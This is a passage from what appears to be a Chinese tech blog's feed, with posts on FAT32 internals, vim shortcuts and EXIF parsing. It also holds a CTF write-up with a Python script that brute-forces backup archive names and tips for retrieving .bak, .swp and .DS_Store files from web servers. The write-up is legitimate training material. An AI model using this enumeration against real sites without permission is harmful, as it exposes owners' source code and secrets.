    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;GCC是GNU Compiler Collection的缩写，包含gcc、g++等编译工具。这个工具不仅包含编译器，还包含其他工具集，例如ar、nm等。今天简单的讲一讲这个工具。&lt;/p&gt;</summary>
    
    
    
    
    <category term="工具" scheme="https://blog.pillar.fun/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Linux" scheme="https://blog.pillar.fun/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>备份文件泄露漏洞</title>
    <link href="https://blog.pillar.fun/2020/03/02/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://blog.pillar.fun/2020/03/02/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-02T14:18:33.000Z</published>
    <updated>2020-03-09T11:22:47.604Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>这些信息泄露的漏洞只有马虎的程序员才会犯，希望大家都不要犯错哦~<br>这些题在<a href="https://www.ctfhub.com/#/skilltree">ctfhub</a>里都可以重做哒。</p><a id="more"></a><h1 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h1><p>可能会有马虎的程序员将整个网站的源码打包起来且放在了网站目录下，导致我们可以直接获取网站的源码，给我们进一步渗透提供了更加广泛的思路。<br>题目给了我们常见的备份文件字段和后缀，那我们直接写脚本就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&#x27;http://challenge-8b081249201cd9d3.sandbox.ctfhub.com:10080/&#x27;</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="built_in">len</span>(requests.get(url).text))</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure><p>使用request返回数据长度和状态可以判断存在<a href="http://www.zip然后解压发现有一个flag_XXX.txt，再去访问即可。">www.zip然后解压发现有一个flag_XXX.txt，再去访问即可。</a></p><h1 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h1><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码<br>题目里直接index.php.bak，然后用一个普通的文本处理器打开就可以了，或者直接curl。</p><h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>vim在意外退出时候会保存一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的<br>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。<br>于是我们直接/.index.php.swp下载，然后可以用vim恢复他，或者直接用curl，或者用winhex打开也能找到。</p><h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h1><p>DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br>直接curl或者winhex，可以找到对应的txt文件名，然后访问就完事儿了。</p><p>参考：<br><a href="https://blog.csdn.net/pwiling/article/details/51830781">https://blog.csdn.net/pwiling/article/details/51830781</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;这些信息泄露的漏洞只有马虎的程序员才会犯，希望大家都不要犯错哦~&lt;br&gt;这些题在&lt;a href=&quot;https://www.ctfhub.com/#/skilltree&quot;&gt;ctfhub&lt;/a&gt;里都可以重做哒。&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="web" scheme="https://blog.pillar.fun/tags/web/"/>
    
    <category term="信息泄露" scheme="https://blog.pillar.fun/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>FAT32文件系统</title>
    <link href="https://blog.pillar.fun/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://blog.pillar.fun/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-02-29T11:23:07.000Z</published>
    <updated>2020-06-14T14:14:00.235Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>了解文件在硬盘中的存放方式有利于我们更加简便简介的了解计算机系统。今天简述FAT32。</p><a id="more"></a><h1 id="FAT32文件系统结构"><a href="#FAT32文件系统结构" class="headerlink" title="FAT32文件系统结构"></a>FAT32文件系统结构</h1><p>如图<br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/1.jpg" alt></p><h1 id="动手实践"><a href="#动手实践" class="headerlink" title="动手实践"></a>动手实践</h1><h2 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h2><p>管理员启动winhex，选择tools-&gt;open disk即可打开磁盘。<br>首先映入眼帘的是MBR。它占据512字节，描述了卷的各种性质。<br>    0x00~0x02：3字节，跳转指令。<br>    0x03~0x0A：8字节，文件系统标志和版本号。<br>    0x0B~0x0C：2字节，每扇区字节数<br>    0x0D~0x0D：1字节，每簇扇区数<br>    0x0E~0x0F：2字节，保留扇区数<br>    0x10~0x10：1字节，FAT表个数<br>    0x11~0x12：2字节，FAT32必须等于0，FAT12/FAT16为根目录中目录的个数；<br>    0x13~0x14：2字节，FAT32必须等于0，FAT12/FAT16为扇区总数。<br>    0x15~0x15：1字节，哪种存储介质，0xF8标准值，可移动存储介质。<br>    0x16~0x17：2字节，FAT32必须为0，FAT12/FAT16为一个FAT 表所占的扇区数。<br>    0x18~0x19：2字节，每磁道扇区数，只对于“特殊形状”（由磁头和柱面分割为若干磁道）的存储介质有效。<br>    0x1A~0x1B：2字节，磁头数，只对特殊的介质才有效。<br>    0x1C~0x1F：4字节，EBR分区之前所隐藏的扇区数。<br>    0x20~0x23：4字节，文件系统总扇区数。<br>    0x24~0x27：4字节，每个FAT表占用扇区数。<br>    0x28~0x29：2字节，标记，此域FAT32 特有。<br>    0x2A~0x2B：2字节，FAT32版本号0.0，FAT32特有。<br>    0x2C~0x2F：4字节，根目录所在第一个簇的簇号。（虽然在FAT32文件系统下，根目录可以存放在数据区的任何位置，但是通常情况下还是起始于2号簇）<br>    0x30~0x31：2字节，FSINFO（文件系统信息扇区）扇区号0x01，该扇区为操作系统提供关于空簇总数及下一可用簇的信息。<br>    0x32~0x33：2字节，备份引导扇区的位置。备份引导扇区总是位于文件系统的6号扇区。<br>    0x34~0x3F：12字节，用于以后FAT 扩展使用。<br>    0x40~0x40：1字节，与FAT12/16 的定义相同，只不过两者位于启动扇区不同的位置而已。<br>    0x41~0x41：1字节，与FAT12/16 的定义相同，只不过两者位于启动扇区不同的位置而已 。<br>    0x42~0x42：1字节，扩展引导标志，0x29。与FAT12/16 的定义相同，只不过两者位于启动扇区不同的位置而已<br>    0x43~0x46：4字节，卷序列号。通常为一个随机值。<br>    0x47~0x51：11字节，卷标（ASCII码），如果建立文件系统的时候指定了卷标，会保存在此。<br>    0x52~0x59：8字节，文件系统格式的ASCII码，FAT32。<br>    0x5A~0x1FD：共410字节，引导代码。<br>    0x1FE~0x1FF：签名标志。<br>    FAT文件系统将引导代码与文件形同数据结构融合在FAT32文件系统引导扇区的512字节中，90~509字节为引导代码，而FAT12/16则是62~509字节为引导代码。同时，FAT32还可以利用引导扇区后的扇区空间存放附加的引导代码。一个FAT卷即使不是可引导文件系统，也会存在引导代码。<br>winhex自带模板解析DBR。<br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/2.jpg" alt><br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/3.jpg" alt></p><h2 id="FSINFO扇区"><a href="#FSINFO扇区" class="headerlink" title="FSINFO扇区"></a>FSINFO扇区</h2><p>FAT32在保留区中增加了一个FSINFO扇区，用以记录文件系统中空闲簇的数量以及下一可用簇的簇号等信息，以供操作系统作为参考。FSINFO信息扇区一般位于文件系统的1号扇区，结构非常简单。<br>winhex就没有整这个的模板，本来感觉也不是多有用来着。<br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/4.jpg" alt><br>    0x200~0x203：4个字节，扩展引导标志。<br>    0x204~0x3E3：480个字节，未使用，全部置0。<br>    0x3E4~0x3E7：4个字节，FSINFO签名。<br>    0x3E8~0x3EB：4个字节，文件系统的空簇数。<br>    0x3F0~0x3FD：14个字节，未使用。<br>    0x3FE~0x3FF：2个字节，“55 AA”标志。<br>温馨提示：通常情况下，文件系统的2号扇区结尾也会被设置“55 AA”标志。6号扇区也会有一个引导扇区的备份，相应的7号扇区应该是一个备份FSINFO信息扇区，8号扇区可以看做是2号扇区的备份。</p><h2 id="FAT表"><a href="#FAT表" class="headerlink" title="FAT表"></a>FAT表</h2><p>紧跟在保留分区后面的是FAT区，其由两个完全相同的FAT（File Allocation Table， 文件分配表）表单组成，FAT文件系统的名字也是因此而来。FAT 表是一组与数据簇号对应的列表。FAT2紧跟在FAT1之后，它的位置可以通过FAT1的位置加上FAT表的扇区数计算出来。<br>    文件系统分配磁盘空间按簇来分配。因此，文件占有磁盘空间时，基本单位不是字节而是簇，即使某个文件只有一个字节，操作系统也会给它分配一个最小单元：即一个簇。对于大文件，需要分配多个簇。同一个文件的数据并不一定完整地存放在磁盘中一个连续地区域内，而往往会分若干段，像链子一样存放。这种存储方式称为文件的链式存储。为了实现文件的链式存储，文件系统必须准确地记录哪些簇已经被文件占用，还必须为每个已经占用的簇指明存储后继的下一个簇的簇号，对于文件的最后一簇，则要指明本簇无后继簇。这些都是由FAT表来保存的，FAT 表对应表项中记录着它所代表的簇的有关信息：诸如是空，是不是坏簇，是否是已经是某个文件的尾簇等。<br>    对于文件系统来说，FAT表有两个重要作用：描述簇的分配状态以及标明文件或目录的下一簇的簇号。<br>    通常情况下，一个FAT文件系统会有两个FAT表，但有时也允许只有一个FAT表，FAT表的具体个数记录在引导扇区的偏移0x10字节处。<br>    由于FAT区紧跟在文件系统保留区后，所以FAT1在文件系统中的位置可以通过引导记录中偏移0x0E~0x0F字节处的“保留扇区数”得到，即M值。<br>    FAT32中每个簇的簇地址是有32bit（4个字节），FAT表中的所有字节位置以4字节为单位进行划分，并对所有划分后的位置由0进行地址编号。0号地址与1号地址被系统保留并存储特殊标志内容。从2号地址开始，每个地址对应于数据区的簇号，FAT表中的地址编号与数据区中的簇号相同。我们称FAT表中的这些地址为FAT表项，FAT表项中记录的值称为FAT表项值。<br>    当文件系统被创建，也就是进行格式化操作时，分配给FAT区域的空间将会被清空，在FAT1与FAT2的0号表项与1号表项写入特定值。由于创建文件系统的同时也会创建根目录，也就是为根目录分配了一个簇空间，通常为2号簇，与之对应的2号FAT表项记录为2号簇，被写入一个结束标记。<br>    由于簇号起始于2号，所以FAT表项的0号表项与1号表项不与任何簇对应。FAT32的0号表项值总是“F8FFFF0F”。<br>    1号表项可能被用于记录脏标志，以说明文件系统没有被正常卸载或者磁盘表面存在错误。不过这个值并不重要。正常情况下1号表项值为“FFFFFFFF”或“FFFFFF0F”。<br>    如果某个簇未被分配使用，它对应的FAT表项值0；<br>    当某个簇已被分配使用，则它对应的FAT表项内的表项值也就是该文件的下一个存储位置的簇号。如果该文件结束于该簇，则在它的FAT表项中记录的是一个文件结束标记，对于FAT32而言，代表文件结束的FAT表项值为0x0FFFFFFF。<br>    如果某个簇存在坏扇区，则整个簇会用0xFFFFFF7标记为坏簇，这个坏簇标记就记录在它所对应的FAT表项中。<br>    在文件系统中新建文件时，如果新建的文件只占用一个簇，为其分配的簇对应的FAT表项将会写入结束标记。如果新建的文件不只占用一个簇，则在其所占用的每个簇对应的FAT表项中写入为其分配的下一簇的簇号，在最后一个簇对应的FAT表象中写入结束标记。<br>    新建目录时，只为其分配一个簇的空间，对应的FAT表项中写入结束标记。当目录增大超出一个簇的大小时，将会在空闲空间中继续为其分配一个簇，并在FAT表中为其建立FAT表链以描述它所占用的簇情况。<br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/5.jpg" alt><br>0号表项，0x0FFFFFF8，FAT表起始固定标识<br>1号表项，0x0FFFFFFF，不使用，默认值<br>2号表项，0x0FFFFFFF，标识文件结束，表项对应2号簇，根目录所在簇</p><h2 id="目录项"><a href="#目录项" class="headerlink" title="目录项"></a>目录项</h2><p>在两个FAT表之后就是目录项root directory<br>    0x00-0x07：文件名，不足8个字节0x20补全(短文件名8.3命名规则)<br>    0x08-0x0A：扩展名<br>    0x0B：文件属性，0x20表示归档<br>    0x0D：创建时间的10毫秒位<br>    0x0E-0x0F：文件创建时间<br>    0x10-0x11：文件创建日期<br>    0x12-0x13：文件最后访问日期<br>    0x14-0x15：文件起始簇号的高16位<br>    0x16-0x17：文件最近修改时间<br>    0x18-0x19：文件最近修改日期<br>    0x1A-0x1B：文件起始簇号的地16位<br>    0x1C-0x1F：文件的长度，0x2206=8710bytes=8.5K<br>winhex也带有目录项的分析模板<br><img src="/2020/02/29/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/6.jpg" alt></p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>数据是按簇挨个存放着的。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>那么总结来说整个卷是这样子的<br><strong>保留区扇区数[512字节(DBR)+512字节(FSINFO信息)+剩下的保留区]+FAT扇区数+FAT扇区数+根目录+数据区</strong></p><p>参考：<br><a href="https://blog.csdn.net/li_wen01/article/details/79929730">https://blog.csdn.net/li_wen01/article/details/79929730</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;了解文件在硬盘中的存放方式有利于我们更加简便简介的了解计算机系统。今天简述FAT32。&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机基础" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="操作系统" scheme="https://blog.pillar.fun/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>vim快速上手</title>
    <link href="https://blog.pillar.fun/2020/02/27/vim%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    <id>https://blog.pillar.fun/2020/02/27/vim%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/</id>
    <published>2020-02-27T11:18:01.000Z</published>
    <updated>2020-03-09T11:22:55.713Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>终端使用者的诸位一定对vim不陌生，作为一个命令行下的文本编辑软件，vim可谓功能强大。然而对很多年轻人(比如之前的时候的我)，vim功能强大就强大在他能在终端编辑文本，vim和vi有嘛区别？我不到啊？今天来说一说vim的常用的提高文本编辑效率的快捷键。</p><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用linux系统自带的软件管理工具即可，比如apt yum之类的。</p><h1 id="使用vim建立文件"><a href="#使用vim建立文件" class="headerlink" title="使用vim建立文件"></a>使用vim建立文件</h1><p>vim主要分为普通模式和插入模式，普通模式是命令模式，插入模式是编辑模式。<br>顾名思义，编辑模式是修改文本的内容的，命令模式是进行命令操作的。之前我是憨憨的时候是因为我只知道能进入编辑模式，各种方便的快捷键一概不知，这里我们来安排一哈。</p><h2 id="建立文件"><a href="#建立文件" class="headerlink" title="建立文件"></a>建立文件</h2><p>$vim hello.c</p><h2 id="进入插入模式"><a href="#进入插入模式" class="headerlink" title="进入插入模式"></a>进入插入模式</h2><p>打开文件后我们默认在普通模式，按i进入插入模式，最下面会显示– INSERT – </p><h2 id="退出并保存"><a href="#退出并保存" class="headerlink" title="退出并保存"></a>退出并保存</h2><p>在普通模式下输入:wq保存并退出vim编辑器</p><h1 id="使用vim编辑文本"><a href="#使用vim编辑文本" class="headerlink" title="使用vim编辑文本"></a>使用vim编辑文本</h1><h2 id="移动光标hjkl"><a href="#移动光标hjkl" class="headerlink" title="移动光标hjkl"></a>移动光标hjkl</h2><p>vim在普通模式下移动光标的按键是hjkl，h左 j下 k上 l右<br>这个移动方式的好处是我们不用把右手进行位移放到方向键上了，看似没啥用，却实际上对体验有所优化。</p><h2 id="删除字符-x-dd-u-Ctrl-R"><a href="#删除字符-x-dd-u-Ctrl-R" class="headerlink" title="删除字符 x dd u Ctrl+R"></a>删除字符 x dd u Ctrl+R</h2><p>在普通模式下，用x即可在光标向后删除一个字符，用X则是向前删除一个字符。<br>在普通模式下，用ndd可以将光标所在后n行删除，dd就是删除当前行。dG为删除光标到最后一行的所有数据<br>恢复删除命令是u，当你删除了本来不想删除的东西，可以摁u取消之前的删除<br>Ctrl+R是一个撤销，取消在普通模式所做的上一个命令。</p><h2 id="复制粘贴-p-y"><a href="#复制粘贴-p-y" class="headerlink" title="复制粘贴 p y"></a>复制粘贴 p y</h2><p>粘贴命令是p，将内存中的字符复制到当前光标的后面。比如你刚才dd了一行，内存里就有了那一行，你再用p命令就可以将那一行粘贴到光标的位置。<br>y命令（yank）是将指定的字符串复制到内存中，yw命令（yank words）用于复制单词，可以指定复制单词的数量，比如y2w就是赋值两个单词。</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>就相当于常用的ctrl+f。<br>可以用/ 也可以用？，/是搜索下一个，？是搜索上一个<br>n是重复上一个搜索命令，N是反向进行上一个搜索命令。</p><h2 id="跳转到某一行g"><a href="#跳转到某一行g" class="headerlink" title="跳转到某一行g"></a>跳转到某一行g</h2><p>输入”nG”或者”:n”可以让光标转到第n行<br>比如跳到第5行，就可以用 “5G” 或者 “:5”</p><h1 id="vim的格式设置"><a href="#vim的格式设置" class="headerlink" title="vim的格式设置"></a>vim的格式设置</h1><h2 id="设置缩进"><a href="#设置缩进" class="headerlink" title="设置缩进"></a>设置缩进</h2><p>对C语言程序设置锁定，可以用cindent选项；如果需要设置下一行的缩进长度可以设置shiftwidth选项。<br>比如下面的命令实现4个空格的缩进<br><code>:set cindent shiftwidth=4</code><br>这样，当输入一个语句的时候就会自动缩进，在收到’;’&#39;}’的时候会自动取消缩进。这样也可以根据缩进是否正确来判定自己的代码写的是否有问题。</p><h2 id="设置tab键的空格数量"><a href="#设置tab键的空格数量" class="headerlink" title="设置tab键的空格数量"></a>设置tab键的空格数量</h2><p>vimtab的默认移动距离是8个空格，当需要修改的时候需要设置tabstop:<br><code>:set tabstop=n</code></p><h2 id="设置行号"><a href="#设置行号" class="headerlink" title="设置行号"></a>设置行号</h2><p><code>:set number</code><br>使用这条命令后，程序每行代码的头部都会有一个行号的数值。</p><h2 id="Vim配置文件-vimrc"><a href="#Vim配置文件-vimrc" class="headerlink" title="Vim配置文件 .vimrc"></a>Vim配置文件 .vimrc</h2><p>vim启动时会更具~/.vimrc文件配置vi的设置，可以修改.vimrc的数值来定制vim，比如上面提到的shiftwidth、tabstop和number都可以</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set shiftwidth&#x3D;2</span><br><span class="line">set tabstop&#x3D;2</span><br><span class="line">set number</span><br></pre></td></tr></table></figure><h1 id="上面都是抄书的，下面是我个人觉得给劲的。"><a href="#上面都是抄书的，下面是我个人觉得给劲的。" class="headerlink" title="上面都是抄书的，下面是我个人觉得给劲的。"></a>上面都是抄书的，下面是我个人觉得给劲的。</h1><table><thead><tr><th>操作</th><th align="right">结果</th></tr></thead><tbody><tr><td>Ctrl+f</td><td align="right">屏幕上移一页</td></tr><tr><td>Ctrl+b</td><td align="right">屏幕下移一页</td></tr><tr><td>Ctrl+d</td><td align="right">屏幕上移半页</td></tr><tr><td>Ctrl+u</td><td align="right">屏幕下移半页</td></tr><tr><td>0</td><td align="right">移动到一行的最前面</td></tr><tr><td>$</td><td align="right">移动到一行的最后面</td></tr><tr><td>:1,$s/word1/word2/g(c)或:%s/word1/word2/g(c)</td><td align="right">从第一行往后将word1替换成word2，如果是gc的话则会提示你是否confirm。</td></tr><tr><td>(n)yy</td><td align="right">赋值光标往下的n行(yy就是赋值当前一行)</td></tr><tr><td>:w [filename]</td><td align="right">另存为filename</td></tr><tr><td>:r [filename]</td><td align="right">读入filename的数据，相当于write a+</td></tr><tr><td>:n1,n2 w [filename]</td><td align="right">将n1行到n2行的内容存为filename</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;终端使用者的诸位一定对vim不陌生，作为一个命令行下的文本编辑软件，vim可谓功能强大。然而对很多年轻人(比如之前的时候的我)，vim功能强大就强大在他能在终端编辑文本，vim和vi有嘛区别？我不到啊？今天来说一说vim的常用的提高文本编辑效率的快捷键。&lt;/p&gt;</summary>
    
    
    
    
    <category term="工具" scheme="https://blog.pillar.fun/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Linux" scheme="https://blog.pillar.fun/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>图片のEXIF信息</title>
    <link href="https://blog.pillar.fun/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/"/>
    <id>https://blog.pillar.fun/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/</id>
    <published>2020-02-25T11:47:41.000Z</published>
    <updated>2020-05-30T04:54:01.084Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>今天的导语不想写了，么么哒。<br>反正蒙头就放EXIF的文档就完事了！<br><a href="http://www.cipa.jp/std/documents/e/DC-008-2012_E.pdf">Exif 2.3官方标准</a><br><a href="https://web.archive.org/web/20111025004429/http://park2.wakwak.com/~tsuruzoh/Computer/Digicams/exif-e.html">Exif文件格式说明</a></p><a id="more"></a><p>第二个是好东西，非常的全面细致，但是正如我们不愿意拿字典当完全的工具书，他有点超出我所需要的。好在我还搜到了大佬稍微整理了一下的。<br><a href="http://www.cppblog.com/lymons/archive/2013/06/09/108266.html">Exif文件格式描述</a></p><h1 id="什么是-EXIF？"><a href="#什么是-EXIF？" class="headerlink" title="什么是 EXIF？"></a>什么是 EXIF？</h1><p>基本上, Exif文件格式与JPEG 文件格式相同. Exif按照JPEG的规格在JPEG中插入一些 图像/数字相机 的信息数据以及缩略图像. 于是你能通过与JPEG兼容的互联网浏览器/图片浏览器/图像处理等一些软件 来查看Exif格式的图像文件. 就跟浏览通常的JPEG图像文件一样。</p><h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><h2 id="JPEG的格式和标记"><a href="#JPEG的格式和标记" class="headerlink" title="JPEG的格式和标记"></a>JPEG的格式和标记</h2><p>JPEG文件开始于一个二进制的值 ‘0xFFD8’, 结束与’0xFFD9’. 在JPEG的数据 中有好二进制 0xFFXX 的数据, 它们都统称作 <strong>“标记”</strong>, 并且它们代表了一段JPEG的 信息数据。<br>0xFFD8是SOI图像起始(Start of image), 0xFFD9则是EOI图像结束 (End of image)。<br>这两个特殊的标记的后面都不跟随数据, 而其他的标记在后面则会附带数据。<br>标记的基本格式如下<br><strong>0xFF+标记号(1个字节)+数据大小描述符(2个字节)+数据内容(n个字节)</strong><br>比如我用winhex随手打开了一个jpg：<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/1.jpg" alt><br>可以发现,开头确实是0xFFD8。<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/2.jpg" alt><br>结尾也确实是0xFFD9<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/3.jpg" alt><br>顺便分析一个tag:0xE0是标记号，表示这个tag的含义，0x0010是长度，16个字节，数据内容是后面的14个字节。<br><strong>NOTE</strong>：<br>1 这里的 <strong>长度</strong> 是 <strong>BigEndian</strong><br>2 长度包含了长度字段本身，比如本例子上面明明是0x10但是数据只有14字节就这个原因。</p><h2 id="Exif所使用的标记"><a href="#Exif所使用的标记" class="headerlink" title="Exif所使用的标记"></a>Exif所使用的标记</h2><p>0xFFE0~0xFFEF之间的标记被叫做 <strong>“应用标记”</strong>, 它们在JPEG图像解码中不是必须存在的. 它们被使用于用户的应用程序之中。<br>例如, 老款的olympus/canon/casio/agfa数字相机使用JFIF(JPEG文件交换格式/JPEG File Interchange Format)来存储图像。JFIF使用APP0(0xFFE0) 标记来插入数字相机的配置信息数据和缩略图。<br>Exif也使用应用标记来插入数据, 但是Exif使用 APP1(0xFFE1)标记来避免与JFIF格式的冲突 且每一个 Exif 文件格式都开始于它。<br><strong>人话</strong> Exif就是tag位置是E1的JPEG标记。</p><h1 id="Exif——实例一路解析"><a href="#Exif——实例一路解析" class="headerlink" title="Exif——实例一路解析"></a>Exif——实例一路解析</h1><h2 id="Exif格式"><a href="#Exif格式" class="headerlink" title="Exif格式"></a>Exif格式</h2><p>数据结构如下<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/4.jpg" alt><br>总结一下就是<br><strong>0xFFE1(标记号)+2字节(数据大小描述符)+6字节(ascii(EXIF)+00)+8字节(Tiff头)+2字节(目录项长度n)+n*12字节(目录项)+4字节(下一个目录偏移)</strong></p><h3 id="Exif头"><a href="#Exif头" class="headerlink" title="Exif头"></a>Exif头</h3><p>Exif 数据开始于ASCII字符 “Exif” 和2个字节的0x00, 后面才是 Exif的数据. Exif 使用 TIFF 格式来存储数据。<br>前面那张图没有exif数据，这里换了个有exif的图片。<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/6.jpg" alt><br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/5.jpg" alt></p><h3 id="Tiff头"><a href="#Tiff头" class="headerlink" title="Tiff头"></a>Tiff头</h3><p>TIFF格式中前8个字节是 TIFF 头. 其中最开始的前2个字节定义了 TIFF 数据的字节序. 如果这个值是 0x4949=”I I”的话, 就表示按照 “Intel” 的字节序(Little Endian) 来排列数据. 如果是 0x4d4d=”MM”, 则说明按照 “Motorola” 的字节序(Big Endian)来排列数据<br>随后的两个字节是一个2字节长度的固定值 0x002A. 如果数据使用 Intel 字节序, 则这两个 字节的数据排列为 “0x2a,0x00”. 如果是 Motorola 的, 则是 “0x00,0x2a”. TIFF头的最后的 4个字节是到第一个 IFD(图像文件目录/Image File Directory, 将在下一节中描述)的偏移量. 这个偏移量是指从TIFF头(“II” 或者 “MM”)开始, 